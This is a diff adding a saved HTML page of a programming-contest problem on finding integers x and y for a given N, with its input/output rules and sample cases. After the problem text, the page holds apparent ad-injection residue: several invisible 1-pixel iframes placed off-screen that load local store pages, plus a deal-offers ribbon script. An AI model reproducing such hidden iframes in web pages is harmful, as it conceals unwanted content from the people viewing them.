+</v:shape><![endif]--><!--[if !vml]--><img src="11428_files/p11428.gif" v:shapes="_x0000_i1027" height="32" width="103"><!--[endif]--></span><!--[if gte mso 9]><xml>
+ <o:OLEObject Type="Embed" ProgID="Equation.3" ShapeID="_x0000_i1027"
+  DrawAspect="Content" ObjectID="_1267556202">
+ </o:OLEObject>
+</xml><![endif]--></p>
+
+<p class="MsoNormal" style="text-align:center" align="center">&nbsp;</p>
+
+<h5 style="text-align:justify"><span class="stylearial16pt"><span style="font-size:16.0pt">Input</span></span></h5>
+
+<p class="MsoNormal" style="text-align:justify">The input file contains at most 10o
+lines of inputs. Each line contains a positive integer N (0&lt;N&#8804;10000).
+Input is terminated by a line containing a single zero. This line should not be
+processed.</p>
+
+<p class="MsoNormal" style="text-align:justify">&nbsp;</p>
+
+<h4><span class="stylearial16pt"><span style="font-size:16.0pt">Output </span></span></h4>
+
+<p class="MsoNormal" style="text-align:justify">For each line of input produce
+one or more lines of output. Each of these lines contains two positive integers
+x, y separated by a single space, such that<sub><img id="_x0000_i1025" src="11428_files/p11428.gif" height="28" width="94"></sub>. If there is no such
+integer values of x and y then produce the line “No solution” instead. If there
+is more than one solution then output the one with smallest value of y.</p>
+
+<p class="MsoNormal" style="text-align:justify">&nbsp;</p>
+
+<h1 style="text-align:left" align="left"><b><span style="font-size:16.0pt;
+font-family:Arial;font-style:normal">Sample
+Input&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+&nbsp;&nbsp;&nbsp;Output
+ for Sample Input</span></b></h1>
+
+<table class="MsoNormalTable" style="background: none repeat scroll 0% 0% rgb(204, 204, 204); border-collapse: collapse;" border="0" cellpadding="0" cellspacing="0">
+ <tbody><tr style="">
+  <td style="width: 3.2in; border: 1pt solid windowtext; padding: 0in 5.4pt;" valign="top" width="307">
+  <p class="MsoNormal" style="text-autospace:none"><b><span style="font-size:
+  11.0pt;font-family:&quot;Courier New&quot;">7</span></b></p>
+  <p class="MsoNormal" style="text-autospace:none"><b><span style="font-size:
+  11.0pt;font-family:&quot;Courier New&quot;">37</span></b></p>
+  <p class="MsoNormal" style="text-autospace:none"><b><span style="font-size:
+  11.0pt;font-family:&quot;Courier New&quot;">12</span></b></p>
+  <p class="MsoNormal" style="text-autospace:none"><b><span style="font-size:
+  11.0pt;font-family:&quot;Courier New&quot;">0</span></b></p>
+  <p class="MsoNormal" style="text-autospace:none"><b><span style="font-size:
+  11.0pt;font-family:&quot;Courier New&quot;">&nbsp;</span></b></p>
+  </td>
+  <td style="width: 231.85pt; border-width: 1pt 1pt 1pt medium; border-style: solid solid solid none; border-color: windowtext windowtext windowtext -moz-use-text-color; -moz-border-top-colors: none; -moz-border-right-colors: none; -moz-border-bottom-colors: none; -moz-border-left-colors: none; -moz-border-image: none; padding: 0in 5.4pt;" valign="top" width="309">
+  <p class="MsoNormal"><b><span style="font-size:11.0pt;font-family:&quot;Courier New&quot;">2
+  1</span></b></p>
+  <p class="MsoNormal"><b><span style="font-size:11.0pt;font-family:&quot;Courier New&quot;">4
+  3</span></b></p>
+  <p class="MsoNormal"><b><span style="font-size:11.0pt;font-family:&quot;Courier New&quot;">No
+  solution</span></b></p>
+  <p class="MsoNormal"><b><span style="font-size:11.0pt;font-family:&quot;Courier New&quot;">&nbsp;</span></b></p>
+  </td>
+ </tr>
+</tbody></table>
+
+<div class="MsoNormal" style="text-align:center" align="center">
+
+<hr align="center" size="2" width="100%">
+
+</div>
+
+<p class="MsoNormal"><span class="SpellE"><b style="mso-bidi-font-weight:normal"><span style="font-family:Arial">Problemsetter</span></b></span><b style="mso-bidi-font-weight:
+normal"><span style="font-family:Arial">: <span class="SpellE">Shahriar</span>
+Manzoor<o:p></o:p></span></b></p>
+
+<p class="MsoNormal"><b style="mso-bidi-font-weight:normal"><span style="font-family:Arial">Special Thanks: Derek <span class="SpellE">Kisman</span><o:p></o:p></span></b></p>
+
+<p class="MsoNormal"><b style="mso-bidi-font-weight:normal"><span style="font-family:Arial"><o:p>&nbsp;</o:p></span></b></p>
+
+</div>
+
+
+
+
+<div style="display:none;" id="__fghjktghndfgt_once"></div><div style="display:none;" id="__if72ru4sdfsdfrkjahiuyi_once"></div><div style="display:none;" id="__if72ru4sdfsdfruh7fewui_once"></div><div id="__zsc_once"></div><div style="display:none;" id="__hggasdgjhsagd_once"></div><img src="11428_files/seg.gif" style="z-index: -100; position: absolute; left: 0pt; top: 0pt;"><img src="11428_files/seg.gif" style="z-index: -100; position: absolute; left: 0pt; top: 0pt;"><img src="11428_files/logo.gif" style="z-index: -100; position: absolute; left: 0pt; top: 0pt;"><img src="11428_files/seg.gif" style="z-index: -100; position: absolute; left: 0pt; top: 0pt;"><img src="11428_files/seg.gif" style="z-index: -100; position: absolute; left: 0pt; top: 0pt;"><img src="11428_files/seg.gif" style="z-index: -100; position: absolute; left: 0pt; top: 0pt;"><img src="11428_files/seg.gif" style="z-index: -100; position: absolute; left: 0pt; top: 0pt;"><img src="11428_files/seg.gif" style="z-index: -100; position: absolute; left: 0pt; top: 0pt;"><img src="11428_files/seg.gif" style="z-index: -100; position: absolute; left: 0pt; top: 0pt;"><img src="11428_files/seg.gif" style="z-index: -100; position: absolute; left: 0pt; top: 0pt;"><iframe class="ver1773539" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" src="11428_files/Store_008.html" id="5158ff4e913cff73"></iframe><iframe class="ver6068645" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" src="11428_files/Store_008.html" id="d20a9cba38f4699b"></iframe><iframe class="ver6706454" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" src="11428_files/Store_008.html" id="74c2cb66a893bc40"></iframe><iframe class="ver9370517" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" src="11428_files/Store_008.html" id="b40e5f3495ca0b25"></iframe><iframe class="ver486649" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" src="11428_files/Store_008.html" id="96ff2ccc14fc4700"></iframe><iframe class="ver6839387" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" src="11428_files/Store_008.html" id="9ebc993aaeeec5d9"></iframe><iframe class="ver8097813" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" src="11428_files/Store_008.html" id="a6c223fc41cd9cae"></iframe><iframe class="ver2937517" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" src="11428_files/Store_008.html" id="1159a9e91a580f94"></iframe><iframe class="ver8464320" style="position: absolute; width: 1px; height: 1px; left: -100px; top: -100px; visibility: hidden;" src="11428_files/Store_009.html" id="cfbf338175a643b4"></iframe><div class="root-class fo-reset fo-right-ribbon fo-deal-offers ver2750859" data-bind="css: {'fo-hidden': hidden}, event: { mouseout: blockPropagation, mouseover: blockPropagation, mouseup: blockPropagation, mousedown: blockPropagation, click: blockPropagation }">
+
+    <script>
+
+        function postRenderRibbon() {
+
+            try {
+                FO.$(".elps").dotdotdot();
+            }
+            catch (e) {
+            }
+
+            FO.$(".root-class .fo-right-ribbon .fo-suspend").click(function (e) {
+                FO.$(".root-class .fo-right-ribbon .fo-suspend-tooltip").addClass("shown");
+                e.stopPropagation();
+            });
+
+            FO.$("body, .root-class").click(function (e) {
+                var inOptions = FO.$(e.target).closest(".root-class .fo-right-ribbon .fo-suspend-tooltip").length > 0;
+                if (!inOptions) FO.$(".root-class .fo-right-ribbon .fo-suspend-tooltip").removeClass("shown");
+            });
+
+            FO.$(".root-class .fo-right-ribbon .fo-suspend-close-button").click(function (e) {
+                FO.$(".root-class .fo-right-ribbon .fo-suspend-tooltip").removeClass("shown");
+                e.stopPropagation();
+            });
+        }
+
+    </script>
+
+    <!-- ko foreach: { data: ribbonModels }--><!-- /ko -->
+</div></body></html>
